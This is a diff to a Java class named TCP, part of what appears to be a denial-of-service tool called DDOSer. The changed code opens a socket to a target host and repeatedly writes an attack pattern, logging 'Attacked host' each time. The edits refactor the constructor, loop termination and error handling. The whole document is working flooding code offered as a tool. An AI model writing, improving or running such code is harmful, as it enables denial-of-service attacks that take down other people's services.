@@ -28,8 +28,8 @@ public abstract class TCP extends DDOS {
      *
      * @param ddosPattern
      */
-    public TCP(DDOSPattern ddosPattern) {
-        super(ddosPattern);
+    public TCP(DDOSPattern ddosPattern, DDOSer ddoSer) {
+        super(ddosPattern, ddoSer);
     }
 
     /**
@@ -44,17 +44,16 @@ public abstract class TCP extends DDOS {
     public void run() {
         createSocket();
         connectToSocket();
-        while (!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed()) && DDOSer.stopThread != true) {
+        while (!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed()) && ddoSer.stopThread != true) {
             writeLineToSocket(getDdosPattern().getMessage());
-            DDOSer.appendToConsole("Attacked host " + getDdosPattern().getHost() + ":" + getDdosPattern().getPort());
+            DDOSer.appendToConsole("Attacked host (" + getAddress() + ")");
             try {
                 Thread.sleep(getDdosPattern().getTimeout());
             } catch (InterruptedException ex) {
-                ex.getCause();
-            } finally {
-                closeSocket();
+                    System.out.println("Attack stoped: (" + getAddress() + ")" + ex.getMessage());
             }
         }
+        closeSocket();
     }
 
     /**
@@ -67,7 +66,7 @@ public abstract class TCP extends DDOS {
             socket.setKeepAlive(true);
             socket.setSoTimeout(getDdosPattern().getSocketTimeout());
         } catch (SocketException ex) {
-            ex.getCause();
+            ex.printStackTrace();
         }
     }
 
@@ -82,16 +81,13 @@ public abstract class TCP extends DDOS {
         try {
             if (socket != null) socket.connect(getAddress());
         } catch (UnknownHostException ex) {
-//            DDOSer.appendToConsole("Error: Host " + getAddress() + " doesn´t exist!");
-            ex.getCause();
+//            DDOSer.appendToConsole("Error: Unknow host " + getAddress() + " " + ex.getMessage());
         } catch (SocketException ex) {
-//            DDOSer.appendToConsole("Error while creating or accessing a Socket!");
-            closeSocket();
-            ex.getCause();
+//            DDOSer.appendToConsole("Error: Host " + getAddress() + " " + ex.getMessage());
         } catch (IOException ex) {
-//            DDOSer.appendToConsole("Error while connecting a Socket!");
+//            DDOSer.appendToConsole("Error: Host " + getAddress() + " " + ex.getMessage());
+        } finally {
 //            closeSocket();
-            ex.getCause();
         }
     }
 
@@ -104,7 +100,7 @@ public abstract class TCP extends DDOS {
                 socket.close();
             }
         } catch (IOException ex) {
-            ex.getCause();
+            ex.printStackTrace();
         }
     }
 
